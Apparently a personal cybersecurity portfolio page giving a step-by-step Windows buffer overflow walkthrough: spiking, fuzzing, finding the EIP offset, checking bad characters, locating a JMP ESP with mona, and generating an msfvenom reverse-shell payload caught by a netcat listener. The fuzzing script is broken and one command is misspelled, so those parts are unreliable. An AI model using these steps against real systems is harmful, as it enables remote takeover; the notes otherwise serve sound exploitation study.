<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">

    <!--==================== CSS ====================-->
    <link rel="stylesheet" href="assets/css/method-styles.css">

    <title>TITLE</title>
</head>
<body class="dark-theme">
    <!--==================== HEADER ====================-->
    <header class="header" id="header">
        <nav class="nav container">
            <a href="#" class="nav__logo">Tyler O'Hare</a>
            <div class="nav__menu" id="nav-menu">
                <ul class="nav__list grid">
                    <li class="nav__item">
                        <a href="#home" class="nav__link active-link">
                            <i class="uil uil-estate nav__icon"></i> Home
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="#skills" class="nav__link">
                            <i class="uil uil-file-alt nav__icon"></i> Skills
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="#portfolio" class="nav__link">
                            <i class="uil uil-scenery nav__icon"></i> Portfolio
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="#contact" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Contact Me
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Methodology
                        </a>
                    </li>
                </ul>
                <i class="uil uil-times nav__close" id="nav-close"></i>
            </div>

            <div class="nav__btns">
                <!--Theme change button-->
                <i class="uil uil-moon change-theme" id="theme-button"></i>

                <div class="nav__toggle" id="nav-toggle">
                    <i class="uil uil-apps"></i>
                </div>
            </div>
        </nav>
    </header>
    <!--==================== END-HEADER ====================-->


<!--==================== MAIN ====================-->
    <main class="main"><article id="b384e014-9273-4f15-8023-00a7c5db5646" class="page sans"><header><h1 class="page-title">Buffer Overflow</h1></header><div class="page-body"><h2 id="ea32c090-2c51-4e45-a483-d4e2d2371575" class="">Windows:</h2><p id="96a7ad15-333e-4538-82b0-f6f959536c11" class=""><strong>Spiking:</strong></p><p id="057e206a-8449-4bb3-86a3-594a984c368c" class="">Run immunity debugger as admin</p><ul id="bc33647e-908e-449d-a73e-4965e102cf3d" class="bulleted-list"><li style="list-style-type:disc">File → attach → click program</li></ul><ul id="085279e8-01f3-4503-bf55-e31565b6cf7f" class="bulleted-list"><li style="list-style-type:disc">Get your ip</li></ul><ul id="7727455c-05a9-435b-abcb-c5c2de26ecba" class="bulleted-list"><li style="list-style-type:disc">Check each input to try and find the BoF vulnerability</li></ul><ul id="0b76c4aa-3659-438b-b590-5743f7faf896" class="bulleted-list"><li style="list-style-type:disc">generic_send_tcp</li></ul><ul id="ddbd76fe-6801-443d-b892-d51b7f6df516" class="bulleted-list"><li style="list-style-type:disc">#stats.spk<pre id="c149ac0e-ad2e-43d7-acdd-ac3f0ba18d34" class="code"><code>#_readline
#_string(STATS );
#_string_variable(&quot;0&quot;); </code></pre></li></ul><pre id="41532280-d3ba-4686-8ba7-16f8acfb82d8" class="code"><code>generic_send_tcp &lt;ip&gt; 9999 stats.spk 0 0
#repeat for each input
</code></pre><p id="99202b44-01f4-4305-8612-768c0cd46e54" class="">
</p><p id="db71af06-db37-4f90-94cd-692e8ff275ee" class=""><strong>Fuzzing:</strong></p><ul id="c11e96ff-4e98-4896-8d62-f3f5e5a35641" class="bulleted-list"><li style="list-style-type:disc">keep immunity debugger up attached</li></ul><ul id="252c77ba-add9-49ec-af8e-3077dbcceef7" class="bulleted-list"><li style="list-style-type:disc">python fuzzing script:<pre id="f5b728fe-10a9-4ff6-971c-e6a1c5dfeeb0" class="code"><code>#!/usr/bin/python
import sys, socket
from time import sleep
buffer = &quot;A&quot; * 100
while True:
				Try:
						s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)
						s.connect((&lt;ip&gt;,&lt;port&gt;))
						s.send(())</code></pre></li></ul><ul id="f527ec0b-8374-48a0-afdd-b4ddb0d1dcdf" class="bulleted-list"><li style="list-style-type:disc">chmod  +x &lt;script&gt;</li></ul><p id="821883e4-d70f-4f5f-aca6-e2bbb1d4cf11" class="">
</p><p id="3bbf5336-6253-4cf3-87e6-f9b1bfcd2d6b" class=""><strong>Finding the Offset:</strong></p><p id="bc9ef4d3-95f3-4299-ae72-b6b88301c14b" class="">Pattern create</p><pre id="ec233ed1-910f-49e1-8ce7-0535226aec3c" class="code"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;pattern number&gt;
</code></pre><p id="232c85da-763f-480c-8c4a-f3c74cb0e77f" class="">Add the pattern to script or just send</p><ul id="a978985e-67a4-4294-869e-fbc792cd5342" class="bulleted-list"><li style="list-style-type:disc">check EIP, take its value, find offset</li></ul><pre id="5c7d9553-f1af-4595-8f1d-7ed94d20c96e" class="code"><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l &lt;pattern number&gt; -q &lt;EIP Value&gt;</code></pre><p id="7d365d92-46d4-4dfa-9d98-0515ed466955" class=""><strong>Overwriting EIP:</strong></p><ul id="ce09da97-1de8-4be7-9699-f15c834e4b10" class="bulleted-list"><li style="list-style-type:disc">Replace offset with shellcode:</li></ul><ul id="5bb81fd1-a067-4538-9b8f-177757533b81" class="bulleted-list"><li style="list-style-type:disc">“A” * &lt;found offset&gt; + “B” * 4</li></ul><ul id="016972e8-0f1b-452e-9b93-7d9056b4073c" class="bulleted-list"><li style="list-style-type:disc">B should control the EIP now</li></ul><p id="89c9f7b7-3529-477c-879c-1dc35c1cbd73" class="">
</p><p id="81d99c71-d0b6-4fe1-98a9-011576c7d3f1" class=""><strong>Finding Bad Chars:</strong></p><ul id="22582077-4eac-45e0-aca6-351190d1af15" class="bulleted-list"><li style="list-style-type:disc">remove \x00</li></ul><ul id="afe3b20f-91e1-4d1c-b51c-dede62eb29db" class="bulleted-list"><li style="list-style-type:disc">Add bad chars to end of “B” on payload</li></ul><ul id="1deb7f4f-a1a2-4b3c-9851-f5344e80c925" class="bulleted-list"><li style="list-style-type:disc">Look at hex dump<ul id="7f0c7e2e-a1eb-4d47-8163-a625a457112d" class="bulleted-list"><li style="list-style-type:circle">We should see 01 → FF, if not the missing number is probably a bad char.</li></ul><ul id="ef2d3528-fe5c-45ee-a203-1f9eb87689a7" class="bulleted-list"><li style="list-style-type:circle">consecutive bad chars usually only the first is bad char but we can take out both as precaution</li></ul></li></ul><p id="6386b371-f310-49d9-b8de-eab17be4952b" class="">
</p><p id="31dcab65-c187-48db-b305-6b67359e0be9" class="">
</p><p id="80d9fb5b-eebb-4e58-b189-6d11f5ac1551" class=""><strong>Finding the Right Module:</strong></p><ul id="23f33e83-6d46-4a40-9456-9cfa983bb27e" class="bulleted-list"><li style="list-style-type:disc">Look for process  </li></ul><pre id="62af6f2a-479f-4165-8f35-85d514970a9c" class="code"><code>!mona modules
*Look for a module with protections turned OFF note its address and use it*
*note the format should be entered from right to left using &quot;\x00&quot; notation*</code></pre><ul id="41ab32bf-2352-44d7-9b34-563503401e57" class="bulleted-list"><li style="list-style-type:disc">mona.py</li></ul><ul id="1fa285b0-da9b-48a3-ae95-eee3a0b6708f" class="bulleted-list"><li style="list-style-type:disc">Looking for something to attach to program</li></ul><pre id="953341f0-a447-423f-bf52-56a5c4eeb3a0" class="code"><code>locate nasm_shell
nasm_shell
JMP ESP -&gt; FFE4
!mona find -s &quot;\xff\xe4&quot; -m &lt;found-(dll/exe)&gt;
#OR (Include bad chars in string)
!mona jmp -r esp -cpb &quot;\x00&quot;
#Now note the format should be entered from right to left using &quot;\x00&quot; notation*</code></pre><figure id="5c7a2bc1-5c0e-4f68-8a7c-be400751fe7d" class="image"><a href="Buffer%20Overflow%20b384e01492734f15802300a7c5db5646/Untitled.png"><img style="width:1437px" src="Buffer%20Overflow%20b384e01492734f15802300a7c5db5646/Untitled.png"/></a></figure><p id="c4b99713-9048-443c-aeb5-c125e20d0cf7" class="">
</p><ul id="b5856748-c605-453c-81ea-99eaac29eb38" class="bulleted-list"><li style="list-style-type:disc">edit python script</li></ul><ul id="224a0849-cc67-408b-97da-879f086aefa2" class="bulleted-list"><li style="list-style-type:disc">“A” * &lt;offset&gt; + &lt;little endian shellcode&gt;</li></ul><p id="59a1df88-b8b1-400d-af67-29abe6bbf791" class="">
</p><p id="fafee463-c7d4-46fc-a564-3480ca6a6563" class=""><strong>Generating Shellcode &amp; root:</strong></p><pre id="73218f2e-38f9-446c-b5c0-fcfa910fb5ed" class="code"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; EXITFUNC=&lt;thread&gt; -f c -a x86 -f python -b &quot;\x00(bad chars)&quot;</code></pre><ul id="e483fa73-3f20-404d-bf9c-3b509b54fc60" class="bulleted-list"><li style="list-style-type:disc">add generated shellcode to python script</li></ul><ul id="4ed2b62e-9206-4a23-b76a-a2c90cebb6ea" class="bulleted-list"><li style="list-style-type:disc">add + “\x90” (NOP) *32 + overflow</li></ul><ul id="6f6827ec-3594-428c-8733-8b3636f79fb1" class="bulleted-list"><li style="list-style-type:disc">set netcat listener and send of BoF</li></ul><p id="cea974e4-28c5-495b-86f1-acbc86336efd" class="">
</p><p id="030ff057-1d7f-49b2-89cd-c51c2f7313c2" class="">
</p><p id="97f2b196-b2be-45a7-b357-874b370e8a9e" class="">Create a directory at: <strong>c:\mona</strong></p><p id="9265f93c-bb17-4308-b80b-5d0d4fcd8be9" class=""><strong>!mona config -set working folder c:\mona</strong></p><p id="84f0a1c0-e393-47ae-92a0-877e50724eba" class=""><strong>!mona bystearray -cpb “\x00”</strong></p><p id="45e4b816-2d16-4b9a-9143-c134768a6870" class=""><strong>!mona compare -f c:\mona\bytearray.bin -a ESP</strong></p><p id="98ef0f5c-0157-40ea-a9fa-354c4a8b831e" class="">
</p></div></article></main></main>

    <!--==================== FOOTER ====================-->
    <footer class="footer">
        <div class="footer__bg">
            <div class="footer__container container grid">
                <div>
                    <h1 class="footer__title">Tyler O'Hare</h1>
                    <span class="footer__subtitle">Cybersecurity Engineer</span>
                </div>

                <ul class="footer__links">
                    <li>
                        <a href="#skills" class="footer__link">Skills</a>
                    </li>

                    <li>
                        <a href="#portfolio" class="footer__link">Portfolio</a>
                    </li>

                    <li>
                        <a href="#contact" class="footer__link">Contact</a>
                    </li>
                    <li>
                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
                    </li>
                </ul>

                <div class="footer__socials">
                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
                        <i class="uil uil-github-alt"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
                        <i class="uil uil-linkedin-alt"></i>
                    </a>
                </div>
            </div>

            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
        </div>

    </footer>
    <!--==================== END-FOOTER ====================-->


    <!--==================== SCROLL TOP ====================-->
    <a href="" class="scrollup" id="scroll-up">
        <i class="uil uil-arrow-up scroll__icon"></i>
    </a>

    <!--==================== SWIPER JS ====================-->
    <script src="assets/js/swiper-bundle.min.js"></script>

    <!--==================== MAIN JS ====================-->
    <script src="assets/js/main.js"></script>
</body>
</html>